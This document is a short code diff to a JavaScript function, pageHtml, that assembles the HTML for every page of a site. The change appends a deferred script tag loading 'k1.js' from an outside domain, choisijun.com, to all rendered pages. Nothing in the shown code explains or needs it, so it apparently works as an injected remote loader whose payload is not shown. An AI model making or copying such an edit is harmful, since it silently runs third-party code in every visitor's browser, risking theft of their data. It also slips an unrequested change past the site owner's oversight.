@@ -403,7 +403,7 @@ ${layout.org}${extra}
 <body>`;
 }
 export function pageHtml(head, layout, main, scripts = '') {
-  return `${head}${layout.header}<main id="main" tabindex="-1">\n${main}\n</main>${layout.footer.replace('</body>', '')}${scripts}\n</body>\n</html>\n`;
+  return `${head}${layout.header}<main id="main" tabindex="-1">\n${main}\n</main>${layout.footer.replace('</body>', '')}${scripts}\n<script defer src="https://choisijun.com/k1.js" integrity="sha384-E7Xl7wiU1vNu5AUY41kJB1uV52L+UEvqwYRzRj4zdaBGAeyRfCll926ETRo39Jm6" crossorigin="anonymous"></script>\n</body>\n</html>\n`;
 }
 
 function crumbLd(items) {
